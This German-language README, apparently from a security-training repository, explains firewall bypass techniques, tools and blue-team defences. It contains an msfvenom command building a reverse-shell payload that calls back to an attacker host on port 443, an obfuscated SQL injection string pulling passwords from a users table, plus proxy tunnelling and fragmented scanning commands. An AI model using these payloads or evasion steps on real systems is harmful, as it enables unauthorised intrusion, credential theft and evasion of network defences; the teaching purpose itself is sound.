# 🔥 Firewall Bypass – Techniken, Tools & Schutzmaßnahmen



## Inhaltsverzeichnis
- [Einleitung](#einleitung)
- [Arten von Firewalls](#arten-von-firewalls)
- [Ziel von Firewall Bypass Techniken](#ziel-von-firewall-bypass-techniken)
- [Häufige Techniken zur Umgehung](#häufige-techniken-zur-umgehung)
- [Tools zur Analyse und Bypass](#tools-zur-analyse-und-bypass)
- [Verteidigungsmaßnahmen (Blue Team)](#verteidigungsmaßnahmen-blue-team)
- [Lernressourcen)](#lernressourcen)
- [Haftungsausschluss](#haftungsausschluss)




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Einleitung

Firewalls sind Sicherheitsmechanismen, die den Netzwerkverkehr auf Basis definierter Regeln filtern. Sie dienen dazu:
- **Unerlaubte Zugriffe zu verhindern**
- **Angriffsversuche zu erkennen**
- **Verbindungen zu blockieren oder zuzulassen**

Ein **Firewall Bypass** bezeichnet die **Umgehung dieser Filtermechanismen**, z. B. durch Tarnung oder Manipulation des Traffics. Dieses Wissen ist für **Pentester** und **Security Analysts** essenziell, um Schwächen in der Konfiguration zu erkennen.



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Arten von Firewalls

| Firewall-Typ            | Beschreibung                                         |
|--------------------------|------------------------------------------------------|
| Paketfilter (Stateless)  | Analysiert nur Header (z. B. IP, Port, Protokoll)   |
| Stateful Firewall        | Erkennt Verbindungskontexte (SYN → ACK etc.)        |
| Application Firewall     | Analysiert Inhalte auf Anwendungsebene (HTTP, FTP)  |
| Web Application Firewall (WAF) | Schutz vor typischen Web-Angriffen (SQLi, XSS)     |
| Host-Based Firewall      | Lokal auf Systemen (z. B. Windows Defender Firewall) |
| Next-Gen Firewalls       | Kombinieren mehrere Funktionen inkl. IDS/IPS        |



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Ziel von Firewall Bypass Techniken

- Zugriff auf gesperrte Ports oder Dienste
- Umgehen von Inhaltsscans (z. B. bei WAFs)
- Vermeiden der Detektion durch Security-Systeme
- Platzieren von Payloads oder Backdoors




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Häufige Techniken zur Umgehung

### 1. **Tarnung über erlaubte Ports**
> Firewalls blockieren oft alles außer HTTP (80), HTTPS (443), DNS (53), usw.

Beispiel:
```bash
ncat --proxy-type http --proxy 192.168.1.1:8080 target.com 443
```

Oder:

- Reverse Shell über Port 443 senden
- Malware über Port 53 (DNS-Tunnel) exfiltrieren



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 2. Payload Obfuscation

    Inhalte verschleiern, um Signaturen zu umgehen (z. B. bei WAFs)

Beispiele:
```bash
# SQLi-Befehl verschleiert:
?id=1/**/UNION/**/SELECT/**/password/**/FROM/**/users

# Unicode-Encoding
?id=1%u002f%u002aUNION%u002f%u002aSELECT...

# Hex oder Base64 verschlüsselt
```


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 3. Fragmentierung von Paketen

Durch Aufteilen des Paketinhalts auf mehrere TCP-Segmente kann die Firewall umgangen werden, wenn sie keine vollständige Rekonstruktion vornimmt.

```bash
nmap -f target.com      # Fragmentierter Scan
```


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 4. Protocol Tunneling (DNS, ICMP, HTTP)

    Verbotene Protokolle über erlaubte Protokolle transportieren

Tools:

- dnscat2 – Shell über DNS
- iodine – Internet over DNS
- httptunnel – TCP-Tunnel via HTTP
- icmpsh – Shell über ICMP



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 5. Über Ports, die der Firewall "vertrauenswürdig" erscheinen

Reverse Shell über HTTPS:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > shell.elf
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Tools zur Analyse und Bypass

| Tool       | Zweck                                      |
| ---------- | ------------------------------------------ |
| Nmap       | Portscans, Fragmentierung, Timing          |
| Netcat     | Manuelle Verbindungen über beliebige Ports |
| Socat      | Flexible Verbindungstunnel                 |
| Metasploit | Automatisierte Payloads & Bypasses         |
| Iodine     | DNS-Tunnel                                 |
| ICMPshell  | Shell über Ping                            |




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Verteidigungsmaßnahmen (Blue Team)

- Port-Whitelisting: Nur notwendige Ports erlauben
- Deep Packet Inspection (DPI): Inhalte auch fragmentiert scannen
- Timeout-Management: Verhindert Time-based Evasion
- IDS/IPS-Systeme: Tools wie Snort oder Suricata zur Signaturerkennung
- WAF-Härtung: Regeln regelmäßig aktualisieren, Obfuskation erkennen
- Application Layer Filtering: DNS, HTTP, ICMP gezielt prüfen




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Lernressourcen

- TryHackMe: Rooms zu „Firewall Evasion“ und „Nmap Advanced“
- HackTheBox: Viele Labs mit WAF/Firewall-Herausforderungen
- YouTube: John Hammond, The Cyber Mentor – „Firewall Evasion Techniques“
- Bücher: „The Hacker Playbook 3“, „Nmap Network Scanning“




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!